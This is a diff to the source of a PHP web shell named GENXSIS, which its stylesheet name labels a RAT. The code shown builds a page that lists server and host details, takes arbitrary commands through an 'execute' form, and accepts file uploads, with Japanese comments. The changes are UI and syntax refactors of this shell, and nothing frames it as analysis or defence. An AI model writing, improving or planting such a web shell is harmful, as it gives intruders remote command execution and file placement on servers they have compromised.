@@ -10,7 +10,7 @@ function toUTF8($output) {
 session_start(); // セッションを開始
 
 // 現在のディレクトリを取得
-$currentDir = isset($_SESSION['currentDir']) ? $_SESSION['currentDir'] : getcwd();
+$currentDir = $_SESSION['currentDir'] ?? getcwd();
 
 // ファイルリストを取得
 $files = scandir($currentDir);
@@ -88,26 +88,37 @@ echo "<html lang='ja'>";
 echo "<head>";
 echo "<meta charset='UTF-8'>";
 echo "<title>GENXSIS</title>";
-echo "<link rel='stylesheet' href='res/css/style.css'>";
+echo "<link rel='stylesheet' href='res/css/genxsis-rat.css'>";
 echo "<style>pre { width: 85%; height: 300px; overflow: auto; margin: 0 auto; }</style>";
 echo "</head>";
 echo "<body>";
 echo "<h1>GENXSIS</h1>";
 
 print "<table class='status-table'>";
-print "<tr><td><b>Remote Host:</b></td><td>".(isset($_SERVER['REMOTE_HOST']) ? $_SERVER['REMOTE_HOST'] : "N/A")." (".(isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : "N/A").")</td></tr>";
-print "<tr><td><b>Server Signature:</b></td><td>".(isset($_SERVER['SERVER_SIGNATURE']) ? $_SERVER['SERVER_SIGNATURE'] : "N/A")."</td></tr>";
-print "<tr><td><b>Server Address:</b></td><td>".(isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : "N/A")."</td></tr>";
-print "<tr><td><b>Server Port:</b></td><td>".(isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : "N/A")."</td></tr>";
-print "<tr><td><b>Server Software:</b></td><td>".(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : "N/A")."</td></tr>";
-print "<tr><td><b>Server Protocol:</b></td><td>".(isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : "N/A")."</td></tr>";
-print "<tr><td><b>Document Root:</b></td><td>".(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : "N/A")."</td></tr>";
+print "<tr><td><b>Remote Host:</b></td><td>".($_SERVER['REMOTE_HOST'] ?? "N/A")." (".($_SERVER['REMOTE_ADDR'] ?? "N/A").")</td></tr>";
+print "<tr><td><b>Server Signature:</b></td><td>".($_SERVER['SERVER_SIGNATURE'] ?? "N/A")."</td></tr>";
+print "<tr><td><b>Server Address:</b></td><td>".($_SERVER['SERVER_ADDR'] ?? "N/A")."</td></tr>";
+print "<tr><td><b>Server Port:</b></td><td>".($_SERVER['SERVER_PORT'] ?? "N/A")."</td></tr>";
+print "<tr><td><b>Server Software:</b></td><td>".($_SERVER['SERVER_SOFTWARE'] ?? "N/A")."</td></tr>";
+print "<tr><td><b>Server Protocol:</b></td><td>".($_SERVER['SERVER_PROTOCOL'] ?? "N/A")."</td></tr>";
+print "<tr><td><b>Document Root:</b></td><td>".($_SERVER['DOCUMENT_ROOT'] ?? "N/A")."</td></tr>";
 print "<tr><td><b>OS Name:</b></td><td>".PHP_OS."</td></tr>";
 print "<tr><td><b>PC Name:</b></td><td>".gethostname()."</td></tr>";
 print "</table>";
 
-echo "<b>Current Directory</b><br><i>" . $_SESSION['currentDir'] . "</i>";
+echo "<b class='current-dir'>Current Directory</b>";
 
+echo "<div class='current-dir-container'>";
+
+echo "<form method='post' class='reset'>";
+echo "<input type='hidden' name='resetDir' value='1'>";
+echo "<input type='submit' value='Reset'>";
+echo "</form>";
+
+echo "<i class='dir-path'>" . $_SESSION['currentDir'] . "</i>";
+echo "</div>";
+
+echo "<div class='forms'>";
 echo "<form method='post' class='execute'>";
 echo "<label><input type='text' name='command' size='50'></label>";
 echo "<input type='submit' value='execute'>";
@@ -123,14 +134,13 @@ echo "<input type='file' name='uploadedFile'>";
 echo "<input type='submit' value='upload'>";
 echo "</form>";
 
-echo "<form method='post' class='reset'>";
-echo "<input type='hidden' name='resetDir' value='1'>";
-echo "<input type='submit' value='Reset directory'>";
-echo "</form>";
+echo "</div>";
 
+echo "<hr>";
+echo "<div class='result'>";
 echo "<h2>Execution Result：</h2>";
 if ($return_var == 0) {
-    echo '<pre>';
+    echo '<pre class="output">';
     if (is_array($output)) {
         foreach ($output as $line) {
             echo htmlspecialchars($line) . PHP_EOL;
@@ -150,6 +160,8 @@ if ($uploadSuccess) {
 if($message){
     echo htmlspecialchars($message);
 }
+
+echo "</div>";
 echo "</body>";
 echo "</html>";
 
